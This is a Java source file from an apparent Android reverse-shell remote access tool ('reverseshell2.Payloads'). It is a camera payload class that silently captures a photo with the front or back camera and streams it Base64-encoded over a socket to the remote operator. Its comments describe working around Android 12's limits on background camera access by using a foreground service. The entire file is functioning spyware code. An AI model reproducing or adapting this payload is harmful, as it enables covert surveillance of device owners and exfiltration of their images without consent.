package com.example.reverseshell2.Payloads;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;
import android.util.Size;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.Collections;
import java.util.Comparator;

/**
 * Camera payload rewritten for Android 12 using the Camera2 API.
 *
 * Important (Android 11+ / Android 12+): the camera CANNOT be opened while the
 * app is in the background unless the app is running a foreground service with
 * foregroundServiceType="camera". Use {@link CameraService} to start this class
 * from the background:
 *
 *     CameraService.start(context, cameraId, socketOutputStream);
 *
 * Output protocol is unchanged: Base64-encoded JPEG followed by "END123\n".
 */
public class CameraPreview {

    /** Optional callback so callers (e.g. a foreground service) know when we are done. */
    public interface CameraCallback {
        void onCaptureComplete();
        void onCaptureError(String reason);
    }

    private Context context;
    private OutputStream out;
    private CameraCallback callback;

    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private String cameraId;

    static String TAG = "cameraPreviewClass";

    public CameraPreview(Context context) {
        this.context = context;
    }

    public void setCallback(CameraCallback callback) {
        this.callback = callback;
    }

    /**
     * Opens the camera and takes a single picture, then writes the Base64 JPEG
     * followed by "END123\n" to the provided OutputStream.
     *
     * @param cameraID     0 = back camera, 1 = front camera (falls back if unavailable)
     * @param outputStream stream to write the encoded picture to
     */
    public void startUp(int cameraID, OutputStream outputStream) {
        this.out = outputStream;

        if (out == null) {
            Log.e(TAG, "OutputStream is null, aborting");
            return;
        }

        if (!hasCameraPermission()) {
            Log.e(TAG, "CAMERA permission not granted");
            fail("CAMERA permission not granted");
            return;
        }

        startBackgroundThread();

        CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        if (manager == null) {
            fail("Camera service unavailable");
            return;
        }

        try {
            String[] ids = manager.getCameraIdList();
            if (ids.length == 0) {
                fail("No camera available on device");
                return;
            }

            cameraId = pickCamera(manager, ids, cameraID);
            if (cameraId == null) {
                fail("Requested camera not found");
                return;
            }

            manager.openCamera(cameraId, stateCallback, backgroundHandler);

        } catch (SecurityException e) {
            Log.e(TAG, "SecurityException while opening camera. On Android 12+ the camera "
                    + "cannot be opened from the background unless the app is running a "
                    + "foreground service with foregroundServiceType=\"camera\".", e);
            fail("SecurityException: " + e.getMessage());
        } catch (CameraAccessException e) {
            Log.e(TAG, "CameraAccessException while opening camera", e);
            fail("CameraAccessException: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Unexpected error while opening camera", e);
            fail("Exception: " + e.getMessage());
        }
    }

    /* ------------------------------------------------------------------ */
    /* Camera2 callbacks                                                   */
    /* ------------------------------------------------------------------ */

    private final CameraDevice.StateCallback stateCallback = new CameraDevice.StateCallback() {
        @Override
        public void onOpened(CameraDevice camera) {
            cameraDevice = camera;
            createCaptureSession();
        }

        @Override
        public void onDisconnected(CameraDevice camera) {
            camera.close();
            cameraDevice = null;
            fail("Camera disconnected");
        }

        @Override
        public void onError(CameraDevice camera, int error) {
            camera.close();
            cameraDevice = null;
            fail("Camera error: " + error);
        }
    };

    private void createCaptureSession() {
        try {
            CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            CameraCharacteristics characteristics = manager.getCameraCharacteristics(cameraId);
            StreamConfigurationMap map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (map == null) {
                fail("No stream configuration available");
                return;
            }

            Size[] jpegSizes = map.getOutputSizes(ImageFormat.JPEG);
            if (jpegSizes == null || jpegSizes.length == 0) {
                fail("No JPEG output sizes available");
                return;
            }

            Size largest = Collections.max(Arrays.asList(jpegSizes), new CompareSizesByArea());
            imageReader = ImageReader.newInstance(
                    largest.getWidth(), largest.getHeight(), ImageFormat.JPEG, 2);
            imageReader.setOnImageAvailableListener(onImageAvailableListener, backgroundHandler);

            cameraDevice.createCaptureSession(
                    Collections.singletonList(imageReader.getSurface()),
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(CameraCaptureSession session) {
                            captureSession = session;
                            captureStill();
                        }

                        @Override
                        public void onConfigureFailed(CameraCaptureSession session) {
                            fail("Capture session configure failed");
                        }
                    },
                    backgroundHandler);

        } catch (CameraAccessException | IllegalStateException e) {
            Log.e(TAG, "createCaptureSession failed", e);
            fail("createCaptureSession failed: " + e.getMessage());
        }
    }

    private void captureStill() {
        try {
            CaptureRequest.Builder builder =
                    cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            builder.addTarget(imageReader.getSurface());
            builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
            builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);
            builder.set(CaptureRequest.JPEG_QUALITY, (byte) 100);
            builder.set(CaptureRequest.JPEG_ORIENTATION, getJpegOrientation());

            captureSession.capture(builder.build(), new CameraCaptureSession.CaptureCallback() {
                @Override
                public void onCaptureCompleted(CameraCaptureSession session,
                                               CaptureRequest request,
                                               TotalCaptureResult result) {
                    // The JPEG bytes are delivered via onImageAvailableListener.
                }
            }, backgroundHandler);

        } catch (CameraAccessException | IllegalStateException e) {
            Log.e(TAG, "captureStill failed", e);
            fail("captureStill failed: " + e.getMessage());
        }
    }

    private final ImageReader.OnImageAvailableListener onImageAvailableListener =
            new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    Image image = null;
                    try {
                        image = reader.acquireLatestImage();
                        if (image != null) {
                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] bytes = new byte[buffer.remaining()];
                            buffer.get(bytes);
                            releaseCamera();
                            sendPhoto(bytes);
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error acquiring image", e);
                        releaseCamera();
                        fail("Image acquire failed: " + e.getMessage());
                    } finally {
                        if (image != null) {
                            image.close();
                        }
                    }
                }
            };

    /* ------------------------------------------------------------------ */
    /* Sending the photo                                                   */
    /* ------------------------------------------------------------------ */

    private void sendPhoto(byte[] data) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
            if (bitmap != null) {
                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, bos);
            } else {
                bos.write(data);
            }

            byte[] byteArr = bos.toByteArray();
            final String encodedImage = Base64.encodeToString(byteArr, Base64.DEFAULT);

            Thread thread = new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        out.write(encodedImage.getBytes("UTF-8"));
                        out.write("END123\n".getBytes("UTF-8"));
                        out.flush();
                        Log.i(TAG, "Photo sent");
                    } catch (Exception e) {
                        Log.e(TAG, "Send photo failed: " + e.getMessage());
                    } finally {
                        if (callback != null) {
                            callback.onCaptureComplete();
                        }
                    }
                }
            });
            thread.start();

        } catch (Exception e) {
            Log.e(TAG, "sendPhoto failed", e);
            if (callback != null) {
                callback.onCaptureError(e.getMessage());
            }
        }
    }

    /* ------------------------------------------------------------------ */
    /* Helpers                                                             */
    /* ------------------------------------------------------------------ */

    private boolean hasCameraPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return context.checkSelfPermission(Manifest.permission.CAMERA)
                    == PackageManager.PERMISSION_GRANTED;
        }
        return true; // pre-Marshmallow permissions are granted at install time
    }

    private String pickCamera(CameraManager manager, String[] ids, int preferred)
            throws CameraAccessException {
        // preferred: 0 = back, 1 = front
        int wanted = (preferred == 1)
                ? CameraCharacteristics.LENS_FACING_FRONT
                : CameraCharacteristics.LENS_FACING_BACK;

        for (String id : ids) {
            CameraCharacteristics ch = manager.getCameraCharacteristics(id);
            Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
            if (facing != null && facing == wanted) {
                return id;
            }
        }
        // Fall back to the first available camera if the requested facing is missing.
        return ids[0];
    }

    private int getJpegOrientation() {
        int orientation = 0;
        try {
            CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            CameraCharacteristics ch = manager.getCameraCharacteristics(cameraId);
            Integer sensorOrientation = ch.get(CameraCharacteristics.SENSOR_ORIENTATION);
            Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
            if (sensorOrientation != null) {
                orientation = sensorOrientation;
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    orientation = (360 - orientation) % 360; // mirror the front camera
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "getJpegOrientation failed", e);
        }
        return orientation;
    }

    private void fail(String reason) {
        Log.e(TAG, reason);
        releaseCamera();
        writeEnd();
        if (callback != null) {
            callback.onCaptureError(reason);
        }
    }

    private void writeEnd() {
        try {
            if (out != null) {
                out.write("END123\n".getBytes("UTF-8"));
                out.flush();
            }
        } catch (IOException e) {
            Log.e(TAG, "writeEnd failed", e);
        }
    }

    private void releaseCamera() {
        if (captureSession != null) {
            captureSession.close();
            captureSession = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        stopBackgroundThread();
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void stopBackgroundThread() {
        if (backgroundThread == null) {
            return;
        }
        HandlerThread thread = backgroundThread;
        backgroundThread = null;
        backgroundHandler = null;

        if (thread.getId() == Thread.currentThread().getId()) {
            // Called from inside the background thread itself (e.g. the ImageReader
            // listener) - we cannot join() the current thread, just quit the looper.
            thread.quitSafely();
            return;
        }
        thread.quitSafely();
        try {
            thread.join();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    /** Compares two Size objects by area (width * height). */
    static class CompareSizesByArea implements Comparator<Size> {
        @Override
        public int compare(Size lhs, Size rhs) {
            return Long.signum((long) lhs.getWidth() * lhs.getHeight()
                    - (long) rhs.getWidth() * rhs.getHeight());
        }
    }
}

